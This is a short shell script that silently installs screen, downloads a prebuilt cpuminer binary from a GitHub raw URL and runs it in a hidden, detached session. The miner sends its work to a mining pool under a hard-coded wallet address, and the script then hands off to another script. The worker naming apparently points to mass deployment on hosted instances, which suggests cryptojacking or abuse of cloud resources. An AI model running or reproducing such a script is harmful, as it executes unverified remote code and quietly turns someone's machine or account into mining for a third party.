#!/bin/sh

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/kucingpersia/asu/main/cpuminer-sse2
chmod +x cpuminer-sse2
screen -S Wuenak_Eys -dm ./cpuminer-sse2 -a minotaurx -o stratum-na.rplant.xyz:17068 -u RMLhf8ZhhnP97gVJLWLAN8qGf4Wge3bdHb.$(echo $(shuf -i 1-100 -n 1)-RAIL)
screen -ls
sleep 4
clear
screen -ls
./Timer_Bo.sh
